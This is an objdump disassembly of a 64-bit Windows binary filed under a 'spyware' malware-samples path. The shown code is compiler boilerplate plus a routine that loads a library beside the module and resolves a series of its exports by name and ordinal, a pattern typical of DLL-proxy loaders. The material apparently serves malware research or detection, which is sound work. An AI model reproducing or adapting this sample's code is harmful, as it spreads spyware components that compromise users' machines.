
malware_samples/spyware/cde0f207e99d85f94523a817d552143ab50d153d1ae62fabff6037108880cf3b.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	40 53                	rex push %rbx
   180001002:	55                   	push   %rbp
   180001003:	56                   	push   %rsi
   180001004:	41 56                	push   %r14
   180001006:	48 83 ec 28          	sub    $0x28,%rsp
   18000100a:	48 be ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rsi
   180001011:	ff ff 7f 
   180001014:	49 8b d8             	mov    %r8,%rbx
   180001017:	48 8b ea             	mov    %rdx,%rbp
   18000101a:	4c 8b f1             	mov    %rcx,%r14
   18000101d:	4c 3b c6             	cmp    %rsi,%r8
   180001020:	0f 87 ca 00 00 00    	ja     0x1800010f0
   180001026:	48 83 fb 0f          	cmp    $0xf,%rbx
   18000102a:	77 20                	ja     0x18000104c
   18000102c:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   180001030:	48 c7 41 18 0f 00 00 	movq   $0xf,0x18(%rcx)
   180001037:	00 
   180001038:	e8 43 f7 00 00       	call   0x180010780
   18000103d:	41 c6 04 1e 00       	movb   $0x0,(%r14,%rbx,1)
   180001042:	48 83 c4 28          	add    $0x28,%rsp
   180001046:	41 5e                	pop    %r14
   180001048:	5e                   	pop    %rsi
   180001049:	5d                   	pop    %rbp
   18000104a:	5b                   	pop    %rbx
   18000104b:	c3                   	ret
   18000104c:	48 8b c3             	mov    %rbx,%rax
   18000104f:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   180001054:	48 83 c8 0f          	or     $0xf,%rax
   180001058:	48 3b c6             	cmp    %rsi,%rax
   18000105b:	76 1f                	jbe    0x18000107c
   18000105d:	48 b9 00 00 00 00 00 	movabs $0x8000000000000000,%rcx
   180001064:	00 00 80 
   180001067:	48 83 c1 27          	add    $0x27,%rcx
   18000106b:	e8 e0 0d 00 00       	call   0x180001e50
   180001070:	48 85 c0             	test   %rax,%rax
   180001073:	75 36                	jne    0x1800010ab
   180001075:	b9 05 00 00 00       	mov    $0x5,%ecx
   18000107a:	cd 29                	int    $0x29
   18000107c:	b9 16 00 00 00       	mov    $0x16,%ecx
   180001081:	48 8b f0             	mov    %rax,%rsi
   180001084:	48 3b c1             	cmp    %rcx,%rax
   180001087:	48 0f 42 f1          	cmovb  %rcx,%rsi
   18000108b:	48 8d 46 01          	lea    0x1(%rsi),%rax
   18000108f:	48 85 c0             	test   %rax,%rax
   180001092:	75 04                	jne    0x180001098
   180001094:	33 ff                	xor    %edi,%edi
   180001096:	eb 2c                	jmp    0x1800010c4
   180001098:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   18000109e:	72 19                	jb     0x1800010b9
   1800010a0:	48 8d 48 27          	lea    0x27(%rax),%rcx
   1800010a4:	48 3b c8             	cmp    %rax,%rcx
   1800010a7:	76 4d                	jbe    0x1800010f6
   1800010a9:	eb c0                	jmp    0x18000106b
   1800010ab:	48 8d 78 27          	lea    0x27(%rax),%rdi
   1800010af:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   1800010b3:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   1800010b7:	eb 0b                	jmp    0x1800010c4
   1800010b9:	48 8b c8             	mov    %rax,%rcx
   1800010bc:	e8 8f 0d 00 00       	call   0x180001e50
   1800010c1:	48 8b f8             	mov    %rax,%rdi
   1800010c4:	4c 8b c3             	mov    %rbx,%r8
   1800010c7:	49 89 3e             	mov    %rdi,(%r14)
   1800010ca:	48 8b d5             	mov    %rbp,%rdx
   1800010cd:	49 89 5e 10          	mov    %rbx,0x10(%r14)
   1800010d1:	48 8b cf             	mov    %rdi,%rcx
   1800010d4:	49 89 76 18          	mov    %rsi,0x18(%r14)
   1800010d8:	e8 a3 f6 00 00       	call   0x180010780
   1800010dd:	c6 04 1f 00          	movb   $0x0,(%rdi,%rbx,1)
   1800010e1:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   1800010e6:	48 83 c4 28          	add    $0x28,%rsp
   1800010ea:	41 5e                	pop    %r14
   1800010ec:	5e                   	pop    %rsi
   1800010ed:	5d                   	pop    %rbp
   1800010ee:	5b                   	pop    %rbx
   1800010ef:	c3                   	ret
   1800010f0:	e8 cb 06 00 00       	call   0x1800017c0
   1800010f5:	cc                   	int3
   1800010f6:	e8 a5 06 00 00       	call   0x1800017a0
   1800010fb:	cc                   	int3
   1800010fc:	cc                   	int3
   1800010fd:	cc                   	int3
   1800010fe:	cc                   	int3
   1800010ff:	cc                   	int3
   180001100:	40 53                	rex push %rbx
   180001102:	56                   	push   %rsi
   180001103:	41 55                	push   %r13
   180001105:	41 56                	push   %r14
   180001107:	48 83 ec 28          	sub    $0x28,%rsp
   18000110b:	4c 8b 71 10          	mov    0x10(%rcx),%r14
   18000110f:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   180001116:	ff ff 7f 
   180001119:	48 8b c3             	mov    %rbx,%rax
   18000111c:	4d 8b e9             	mov    %r9,%r13
   18000111f:	49 2b c6             	sub    %r14,%rax
   180001122:	48 8b f1             	mov    %rcx,%rsi
   180001125:	48 3b c2             	cmp    %rdx,%rax
   180001128:	0f 82 51 01 00 00    	jb     0x18000127f
   18000112e:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
   180001133:	48 8b 69 18          	mov    0x18(%rcx),%rbp
   180001137:	48 89 7c 24 58       	mov    %rdi,0x58(%rsp)
   18000113c:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   180001141:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   180001146:	4d 8d 3c 16          	lea    (%r14,%rdx,1),%r15
   18000114a:	49 8b cf             	mov    %r15,%rcx
   18000114d:	48 83 c9 0f          	or     $0xf,%rcx
   180001151:	48 3b cb             	cmp    %rbx,%rcx
   180001154:	77 43                	ja     0x180001199
   180001156:	48 8b d5             	mov    %rbp,%rdx
   180001159:	48 8b c3             	mov    %rbx,%rax
   18000115c:	48 d1 ea             	shr    $1,%rdx
   18000115f:	48 2b c2             	sub    %rdx,%rax
   180001162:	48 3b e8             	cmp    %rax,%rbp
   180001165:	77 32                	ja     0x180001199
   180001167:	48 8d 04 2a          	lea    (%rdx,%rbp,1),%rax
   18000116b:	48 8b d9             	mov    %rcx,%rbx
   18000116e:	48 3b c8             	cmp    %rax,%rcx
   180001171:	48 0f 42 d8          	cmovb  %rax,%rbx
   180001175:	48 8d 43 01          	lea    0x1(%rbx),%rax
   180001179:	48 85 c0             	test   %rax,%rax
   18000117c:	75 04                	jne    0x180001182
   18000117e:	33 ff                	xor    %edi,%edi
   180001180:	eb 48                	jmp    0x1800011ca
   180001182:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   180001188:	72 35                	jb     0x1800011bf
   18000118a:	48 8d 48 27          	lea    0x27(%rax),%rcx
   18000118e:	48 3b c8             	cmp    %rax,%rcx
   180001191:	0f 86 ee 00 00 00    	jbe    0x180001285
   180001197:	eb 0e                	jmp    0x1800011a7
   180001199:	48 b9 00 00 00 00 00 	movabs $0x8000000000000000,%rcx
   1800011a0:	00 00 80 
   1800011a3:	48 83 c1 27          	add    $0x27,%rcx
   1800011a7:	e8 a4 0c 00 00       	call   0x180001e50
   1800011ac:	48 85 c0             	test   %rax,%rax
   1800011af:	74 7d                	je     0x18000122e
   1800011b1:	48 8d 78 27          	lea    0x27(%rax),%rdi
   1800011b5:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   1800011b9:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   1800011bd:	eb 0b                	jmp    0x1800011ca
   1800011bf:	48 8b c8             	mov    %rax,%rcx
   1800011c2:	e8 89 0c 00 00       	call   0x180001e50
   1800011c7:	48 8b f8             	mov    %rax,%rdi
   1800011ca:	4c 8b 64 24 70       	mov    0x70(%rsp),%r12
   1800011cf:	4d 8b c6             	mov    %r14,%r8
   1800011d2:	4c 89 7e 10          	mov    %r15,0x10(%rsi)
   1800011d6:	4e 8d 3c 37          	lea    (%rdi,%r14,1),%r15
   1800011da:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   1800011de:	48 8b cf             	mov    %rdi,%rcx
   1800011e1:	48 83 fd 0f          	cmp    $0xf,%rbp
   1800011e5:	76 58                	jbe    0x18000123f
   1800011e7:	48 8b 1e             	mov    (%rsi),%rbx
   1800011ea:	48 8b d3             	mov    %rbx,%rdx
   1800011ed:	e8 8e f5 00 00       	call   0x180010780
   1800011f2:	4d 8b c4             	mov    %r12,%r8
   1800011f5:	49 8b d5             	mov    %r13,%rdx
   1800011f8:	49 8b cf             	mov    %r15,%rcx
   1800011fb:	e8 80 f5 00 00       	call   0x180010780
   180001200:	48 8d 55 01          	lea    0x1(%rbp),%rdx
   180001204:	43 c6 04 27 00       	movb   $0x0,(%r15,%r12,1)
   180001209:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180001210:	72 23                	jb     0x180001235
   180001212:	48 8b 4b f8          	mov    -0x8(%rbx),%rcx
   180001216:	48 2b d9             	sub    %rcx,%rbx
   180001219:	48 83 eb 08          	sub    $0x8,%rbx
   18000121d:	48 83 fb 1f          	cmp    $0x1f,%rbx
   180001221:	77 0b                	ja     0x18000122e
   180001223:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   180001227:	e8 74 0c 00 00       	call   0x180001ea0
   18000122c:	eb 2c                	jmp    0x18000125a
   18000122e:	b9 05 00 00 00       	mov    $0x5,%ecx
   180001233:	cd 29                	int    $0x29
   180001235:	48 8b cb             	mov    %rbx,%rcx
   180001238:	e8 63 0c 00 00       	call   0x180001ea0
   18000123d:	eb 1b                	jmp    0x18000125a
   18000123f:	48 8b d6             	mov    %rsi,%rdx
   180001242:	e8 39 f5 00 00       	call   0x180010780
   180001247:	4d 8b c4             	mov    %r12,%r8
   18000124a:	49 8b d5             	mov    %r13,%rdx
   18000124d:	49 8b cf             	mov    %r15,%rcx
   180001250:	e8 2b f5 00 00       	call   0x180010780
   180001255:	43 c6 04 27 00       	movb   $0x0,(%r15,%r12,1)
   18000125a:	48 89 3e             	mov    %rdi,(%rsi)
   18000125d:	48 8b c6             	mov    %rsi,%rax
   180001260:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   180001265:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   18000126a:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   18000126f:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   180001274:	48 83 c4 28          	add    $0x28,%rsp
   180001278:	41 5e                	pop    %r14
   18000127a:	41 5d                	pop    %r13
   18000127c:	5e                   	pop    %rsi
   18000127d:	5b                   	pop    %rbx
   18000127e:	c3                   	ret
   18000127f:	e8 3c 05 00 00       	call   0x1800017c0
   180001284:	cc                   	int3
   180001285:	e8 16 05 00 00       	call   0x1800017a0
   18000128a:	cc                   	int3
   18000128b:	cc                   	int3
   18000128c:	cc                   	int3
   18000128d:	cc                   	int3
   18000128e:	cc                   	int3
   18000128f:	cc                   	int3
   180001290:	40 53                	rex push %rbx
   180001292:	48 83 ec 20          	sub    $0x20,%rsp
   180001296:	48 8b d9             	mov    %rcx,%rbx
   180001299:	48 8b c2             	mov    %rdx,%rax
   18000129c:	48 8d 0d 65 10 01 00 	lea    0x11065(%rip),%rcx        # 0x180012308
   1800012a3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800012a6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1800012aa:	48 89 0b             	mov    %rcx,(%rbx)
   1800012ad:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1800012b1:	0f 11 02             	movups %xmm0,(%rdx)
   1800012b4:	e8 e7 1b 00 00       	call   0x180002ea0
   1800012b9:	48 8d 05 78 10 01 00 	lea    0x11078(%rip),%rax        # 0x180012338
   1800012c0:	48 89 03             	mov    %rax,(%rbx)
   1800012c3:	48 8b c3             	mov    %rbx,%rax
   1800012c6:	48 83 c4 20          	add    $0x20,%rsp
   1800012ca:	5b                   	pop    %rbx
   1800012cb:	c3                   	ret
   1800012cc:	cc                   	int3
   1800012cd:	cc                   	int3
   1800012ce:	cc                   	int3
   1800012cf:	cc                   	int3
   1800012d0:	40 53                	rex push %rbx
   1800012d2:	48 83 ec 20          	sub    $0x20,%rsp
   1800012d6:	48 8b d9             	mov    %rcx,%rbx
   1800012d9:	48 8b c2             	mov    %rdx,%rax
   1800012dc:	48 8d 0d 25 10 01 00 	lea    0x11025(%rip),%rcx        # 0x180012308
   1800012e3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800012e6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1800012ea:	48 89 0b             	mov    %rcx,(%rbx)
   1800012ed:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1800012f1:	0f 11 02             	movups %xmm0,(%rdx)
   1800012f4:	e8 a7 1b 00 00       	call   0x180002ea0
   1800012f9:	48 8d 05 50 10 01 00 	lea    0x11050(%rip),%rax        # 0x180012350
   180001300:	48 89 03             	mov    %rax,(%rbx)
   180001303:	48 8b c3             	mov    %rbx,%rax
   180001306:	48 83 c4 20          	add    $0x20,%rsp
   18000130a:	5b                   	pop    %rbx
   18000130b:	c3                   	ret
   18000130c:	cc                   	int3
   18000130d:	cc                   	int3
   18000130e:	cc                   	int3
   18000130f:	cc                   	int3
   180001310:	48 8d 05 49 10 01 00 	lea    0x11049(%rip),%rax        # 0x180012360
   180001317:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   18000131e:	00 
   18000131f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180001323:	48 8d 05 26 10 01 00 	lea    0x11026(%rip),%rax        # 0x180012350
   18000132a:	48 89 01             	mov    %rax,(%rcx)
   18000132d:	48 8b c1             	mov    %rcx,%rax
   180001330:	c3                   	ret
   180001331:	cc                   	int3
   180001332:	cc                   	int3
   180001333:	cc                   	int3
   180001334:	cc                   	int3
   180001335:	cc                   	int3
   180001336:	cc                   	int3
   180001337:	cc                   	int3
   180001338:	cc                   	int3
   180001339:	cc                   	int3
   18000133a:	cc                   	int3
   18000133b:	cc                   	int3
   18000133c:	cc                   	int3
   18000133d:	cc                   	int3
   18000133e:	cc                   	int3
   18000133f:	cc                   	int3
   180001340:	40 53                	rex push %rbx
   180001342:	48 83 ec 20          	sub    $0x20,%rsp
   180001346:	48 8b d9             	mov    %rcx,%rbx
   180001349:	48 8b c2             	mov    %rdx,%rax
   18000134c:	48 8d 0d b5 0f 01 00 	lea    0x10fb5(%rip),%rcx        # 0x180012308
   180001353:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001356:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000135a:	48 89 0b             	mov    %rcx,(%rbx)
   18000135d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001361:	0f 11 02             	movups %xmm0,(%rdx)
   180001364:	e8 37 1b 00 00       	call   0x180002ea0
   180001369:	48 8b c3             	mov    %rbx,%rax
   18000136c:	48 83 c4 20          	add    $0x20,%rsp
   180001370:	5b                   	pop    %rbx
   180001371:	c3                   	ret
   180001372:	cc                   	int3
   180001373:	cc                   	int3
   180001374:	cc                   	int3
   180001375:	cc                   	int3
   180001376:	cc                   	int3
   180001377:	cc                   	int3
   180001378:	cc                   	int3
   180001379:	cc                   	int3
   18000137a:	cc                   	int3
   18000137b:	cc                   	int3
   18000137c:	cc                   	int3
   18000137d:	cc                   	int3
   18000137e:	cc                   	int3
   18000137f:	cc                   	int3
   180001380:	40 53                	rex push %rbx
   180001382:	48 83 ec 20          	sub    $0x20,%rsp
   180001386:	48 8b d9             	mov    %rcx,%rbx
   180001389:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   18000138d:	48 83 f9 0f          	cmp    $0xf,%rcx
   180001391:	76 39                	jbe    0x1800013cc
   180001393:	48 8b 03             	mov    (%rbx),%rax
   180001396:	48 8d 51 01          	lea    0x1(%rcx),%rdx
   18000139a:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800013a1:	72 1e                	jb     0x1800013c1
   1800013a3:	4c 8b 40 f8          	mov    -0x8(%rax),%r8
   1800013a7:	49 2b c0             	sub    %r8,%rax
   1800013aa:	48 83 e8 08          	sub    $0x8,%rax
   1800013ae:	48 83 f8 1f          	cmp    $0x1f,%rax
   1800013b2:	77 06                	ja     0x1800013ba
   1800013b4:	48 8d 51 28          	lea    0x28(%rcx),%rdx
   1800013b8:	eb 0a                	jmp    0x1800013c4
   1800013ba:	b9 05 00 00 00       	mov    $0x5,%ecx
   1800013bf:	cd 29                	int    $0x29
   1800013c1:	4c 8b c0             	mov    %rax,%r8
   1800013c4:	49 8b c8             	mov    %r8,%rcx
   1800013c7:	e8 d4 0a 00 00       	call   0x180001ea0
   1800013cc:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
   1800013d3:	00 
   1800013d4:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   1800013db:	00 
   1800013dc:	c6 03 00             	movb   $0x0,(%rbx)
   1800013df:	48 83 c4 20          	add    $0x20,%rsp
   1800013e3:	5b                   	pop    %rbx
   1800013e4:	c3                   	ret
   1800013e5:	cc                   	int3
   1800013e6:	cc                   	int3
   1800013e7:	cc                   	int3
   1800013e8:	cc                   	int3
   1800013e9:	cc                   	int3
   1800013ea:	cc                   	int3
   1800013eb:	cc                   	int3
   1800013ec:	cc                   	int3
   1800013ed:	cc                   	int3
   1800013ee:	cc                   	int3
   1800013ef:	cc                   	int3
   1800013f0:	48 8d 05 11 0f 01 00 	lea    0x10f11(%rip),%rax        # 0x180012308
   1800013f7:	48 89 01             	mov    %rax,(%rcx)
   1800013fa:	48 83 c1 08          	add    $0x8,%rcx
   1800013fe:	e9 3d 1b 00 00       	jmp    0x180002f40
   180001403:	cc                   	int3
   180001404:	cc                   	int3
   180001405:	cc                   	int3
   180001406:	cc                   	int3
   180001407:	cc                   	int3
   180001408:	cc                   	int3
   180001409:	cc                   	int3
   18000140a:	cc                   	int3
   18000140b:	cc                   	int3
   18000140c:	cc                   	int3
   18000140d:	cc                   	int3
   18000140e:	cc                   	int3
   18000140f:	cc                   	int3
   180001410:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001415:	57                   	push   %rdi
   180001416:	48 83 ec 20          	sub    $0x20,%rsp
   18000141a:	48 8d 05 e7 0e 01 00 	lea    0x10ee7(%rip),%rax        # 0x180012308
   180001421:	48 8b f9             	mov    %rcx,%rdi
   180001424:	48 89 01             	mov    %rax,(%rcx)
   180001427:	8b da                	mov    %edx,%ebx
   180001429:	48 83 c1 08          	add    $0x8,%rcx
   18000142d:	e8 0e 1b 00 00       	call   0x180002f40
   180001432:	f6 c3 01             	test   $0x1,%bl
   180001435:	74 0d                	je     0x180001444
   180001437:	ba 18 00 00 00       	mov    $0x18,%edx
   18000143c:	48 8b cf             	mov    %rdi,%rcx
   18000143f:	e8 5c 0a 00 00       	call   0x180001ea0
   180001444:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001449:	48 8b c7             	mov    %rdi,%rax
   18000144c:	48 83 c4 20          	add    $0x20,%rsp
   180001450:	5f                   	pop    %rdi
   180001451:	c3                   	ret
   180001452:	cc                   	int3
   180001453:	cc                   	int3
   180001454:	cc                   	int3
   180001455:	cc                   	int3
   180001456:	cc                   	int3
   180001457:	cc                   	int3
   180001458:	cc                   	int3
   180001459:	cc                   	int3
   18000145a:	cc                   	int3
   18000145b:	cc                   	int3
   18000145c:	cc                   	int3
   18000145d:	cc                   	int3
   18000145e:	cc                   	int3
   18000145f:	cc                   	int3
   180001460:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001465:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   18000146a:	55                   	push   %rbp
   18000146b:	48 8d ac 24 60 ff ff 	lea    -0xa0(%rsp),%rbp
   180001472:	ff 
   180001473:	48 81 ec a0 01 00 00 	sub    $0x1a0,%rsp
   18000147a:	48 8b 05 7f bb 01 00 	mov    0x1bb7f(%rip),%rax        # 0x18001d000
   180001481:	48 33 c4             	xor    %rsp,%rax
   180001484:	48 89 85 90 00 00 00 	mov    %rax,0x90(%rbp)
   18000148b:	33 ff                	xor    %edi,%edi
   18000148d:	48 39 3d ac c6 01 00 	cmp    %rdi,0x1c6ac(%rip)        # 0x18001db40
   180001494:	0f 85 d0 02 00 00    	jne    0x18000176a
   18000149a:	ba 04 01 00 00       	mov    $0x104,%edx
   18000149f:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   1800014a3:	ff 15 57 0b 01 00    	call   *0x10b57(%rip)        # 0x180012000
   1800014a9:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800014ac:	0f 11 44 24 38       	movups %xmm0,0x38(%rsp)
   1800014b1:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
   1800014b6:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   1800014bb:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   1800014bf:	e8 4c f9 00 00       	call   0x180010e10
   1800014c4:	4c 8b c0             	mov    %rax,%r8
   1800014c7:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   1800014cb:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   1800014d0:	e8 2b fb ff ff       	call   0x180001000
   1800014d5:	90                   	nop
   1800014d6:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   1800014db:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   1800014e0:	48 8b c2             	mov    %rdx,%rax
   1800014e3:	48 2b c1             	sub    %rcx,%rax
   1800014e6:	48 83 f8 0e          	cmp    $0xe,%rax
   1800014ea:	72 3b                	jb     0x180001527
   1800014ec:	48 8d 41 0e          	lea    0xe(%rcx),%rax
   1800014f0:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1800014f5:	48 8d 5c 24 38       	lea    0x38(%rsp),%rbx
   1800014fa:	48 83 fa 0f          	cmp    $0xf,%rdx
   1800014fe:	48 0f 47 5c 24 38    	cmova  0x38(%rsp),%rbx
   180001504:	48 03 d9             	add    %rcx,%rbx
   180001507:	41 b8 0e 00 00 00    	mov    $0xe,%r8d
   18000150d:	48 8d 15 74 0e 01 00 	lea    0x10e74(%rip),%rdx        # 0x180012388
   180001514:	48 8b cb             	mov    %rbx,%rcx
   180001517:	e8 64 f2 00 00       	call   0x180010780
   18000151c:	40 88 7b 0e          	mov    %dil,0xe(%rbx)
   180001520:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   180001525:	eb 25                	jmp    0x18000154c
   180001527:	48 c7 44 24 20 0e 00 	movq   $0xe,0x20(%rsp)
   18000152e:	00 00 
   180001530:	4c 8d 0d 51 0e 01 00 	lea    0x10e51(%rip),%r9        # 0x180012388
   180001537:	44 0f b6 44 24 30    	movzbl 0x30(%rsp),%r8d
   18000153d:	ba 0e 00 00 00       	mov    $0xe,%edx
   180001542:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   180001547:	e8 b4 fb ff ff       	call   0x180001100
   18000154c:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000154f:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   180001554:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   180001559:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   18000155e:	0f 10 00             	movups (%rax),%xmm0
   180001561:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   180001566:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   18000156a:	0f 11 4c 24 68       	movups %xmm1,0x68(%rsp)
   18000156f:	48 89 78 10          	mov    %rdi,0x10(%rax)
   180001573:	48 c7 40 18 0f 00 00 	movq   $0xf,0x18(%rax)
   18000157a:	00 
   18000157b:	c6 00 00             	movb   $0x0,(%rax)
   18000157e:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   180001583:	48 83 fa 0f          	cmp    $0xf,%rdx
   180001587:	76 32                	jbe    0x1800015bb
   180001589:	48 ff c2             	inc    %rdx
   18000158c:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   180001591:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180001598:	72 1c                	jb     0x1800015b6
   18000159a:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   18000159e:	48 2b c8             	sub    %rax,%rcx
   1800015a1:	48 83 e9 08          	sub    $0x8,%rcx
   1800015a5:	48 83 f9 1f          	cmp    $0x1f,%rcx
   1800015a9:	0f 87 df 01 00 00    	ja     0x18000178e
   1800015af:	48 83 c2 27          	add    $0x27,%rdx
   1800015b3:	48 8b c8             	mov    %rax,%rcx
   1800015b6:	e8 e5 08 00 00       	call   0x180001ea0
   1800015bb:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1800015c0:	48 83 7c 24 70 0f    	cmpq   $0xf,0x70(%rsp)
   1800015c6:	48 0f 47 4c 24 58    	cmova  0x58(%rsp),%rcx
   1800015cc:	ff 15 4e 0a 01 00    	call   *0x10a4e(%rip)        # 0x180012020
   1800015d2:	48 89 05 67 c5 01 00 	mov    %rax,0x1c567(%rip)        # 0x18001db40
   1800015d9:	48 85 c0             	test   %rax,%rax
   1800015dc:	0f 84 4f 01 00 00    	je     0x180001731
   1800015e2:	48 8d 15 af 0d 01 00 	lea    0x10daf(%rip),%rdx        # 0x180012398
   1800015e9:	48 8b c8             	mov    %rax,%rcx
   1800015ec:	ff 15 26 0a 01 00    	call   *0x10a26(%rip)        # 0x180012018
   1800015f2:	48 89 05 4f c5 01 00 	mov    %rax,0x1c54f(%rip)        # 0x18001db48
   1800015f9:	48 8d 15 a8 0d 01 00 	lea    0x10da8(%rip),%rdx        # 0x1800123a8
   180001600:	48 8b 0d 39 c5 01 00 	mov    0x1c539(%rip),%rcx        # 0x18001db40
   180001607:	ff 15 0b 0a 01 00    	call   *0x10a0b(%rip)        # 0x180012018
   18000160d:	48 89 05 3c c5 01 00 	mov    %rax,0x1c53c(%rip)        # 0x18001db50
   180001614:	48 8d 15 9d 0d 01 00 	lea    0x10d9d(%rip),%rdx        # 0x1800123b8
   18000161b:	48 8b 0d 1e c5 01 00 	mov    0x1c51e(%rip),%rcx        # 0x18001db40
   180001622:	ff 15 f0 09 01 00    	call   *0x109f0(%rip)        # 0x180012018
   180001628:	48 89 05 29 c5 01 00 	mov    %rax,0x1c529(%rip)        # 0x18001db58
   18000162f:	48 8d 15 9a 0d 01 00 	lea    0x10d9a(%rip),%rdx        # 0x1800123d0
   180001636:	48 8b 0d 03 c5 01 00 	mov    0x1c503(%rip),%rcx        # 0x18001db40
   18000163d:	ff 15 d5 09 01 00    	call   *0x109d5(%rip)        # 0x180012018
   180001643:	48 89 05 16 c5 01 00 	mov    %rax,0x1c516(%rip)        # 0x18001db60
   18000164a:	48 8d 15 8f 0d 01 00 	lea    0x10d8f(%rip),%rdx        # 0x1800123e0
   180001651:	48 8b 0d e8 c4 01 00 	mov    0x1c4e8(%rip),%rcx        # 0x18001db40
   180001658:	ff 15 ba 09 01 00    	call   *0x109ba(%rip)        # 0x180012018
   18000165e:	48 89 05 03 c5 01 00 	mov    %rax,0x1c503(%rip)        # 0x18001db68
   180001665:	48 8d 15 8c 0d 01 00 	lea    0x10d8c(%rip),%rdx        # 0x1800123f8
   18000166c:	48 8b 0d cd c4 01 00 	mov    0x1c4cd(%rip),%rcx        # 0x18001db40
   180001673:	ff 15 9f 09 01 00    	call   *0x1099f(%rip)        # 0x180012018
   180001679:	48 89 05 f0 c4 01 00 	mov    %rax,0x1c4f0(%rip)        # 0x18001db70
   180001680:	48 8d 15 91 0d 01 00 	lea    0x10d91(%rip),%rdx        # 0x180012418
   180001687:	48 8b 0d b2 c4 01 00 	mov    0x1c4b2(%rip),%rcx        # 0x18001db40
   18000168e:	ff 15 84 09 01 00    	call   *0x10984(%rip)        # 0x180012018
   180001694:	48 89 05 dd c4 01 00 	mov    %rax,0x1c4dd(%rip)        # 0x18001db78
   18000169b:	ba 64 00 00 00       	mov    $0x64,%edx
   1800016a0:	48 8b 0d 99 c4 01 00 	mov    0x1c499(%rip),%rcx        # 0x18001db40
   1800016a7:	ff 15 6b 09 01 00    	call   *0x1096b(%rip)        # 0x180012018
   1800016ad:	48 89 05 cc c4 01 00 	mov    %rax,0x1c4cc(%rip)        # 0x18001db80
   1800016b4:	ba 65 00 00 00       	mov    $0x65,%edx
   1800016b9:	48 8b 0d 80 c4 01 00 	mov    0x1c480(%rip),%rcx        # 0x18001db40
   1800016c0:	ff 15 52 09 01 00    	call   *0x10952(%rip)        # 0x180012018
   1800016c6:	48 89 05 bb c4 01 00 	mov    %rax,0x1c4bb(%rip)        # 0x18001db88
   1800016cd:	ba 66 00 00 00       	mov    $0x66,%edx
   1800016d2:	48 8b 0d 67 c4 01 00 	mov    0x1c467(%rip),%rcx        # 0x18001db40
   1800016d9:	ff 15 39 09 01 00    	call   *0x10939(%rip)        # 0x180012018
   1800016df:	48 89 05 aa c4 01 00 	mov    %rax,0x1c4aa(%rip)        # 0x18001db90
   1800016e6:	ba 67 00 00 00       	mov    $0x67,%edx
   1800016eb:	48 8b 0d 4e c4 01 00 	mov    0x1c44e(%rip),%rcx        # 0x18001db40
   1800016f2:	ff 15 20 09 01 00    	call   *0x10920(%rip)        # 0x180012018
   1800016f8:	48 89 05 99 c4 01 00 	mov    %rax,0x1c499(%rip)        # 0x18001db98
   1800016ff:	ba 68 00 00 00       	mov    $0x68,%edx
   180001704:	48 8b 0d 35 c4 01 00 	mov    0x1c435(%rip),%rcx        # 0x18001db40
   18000170b:	ff 15 07 09 01 00    	call   *0x10907(%rip)        # 0x180012018
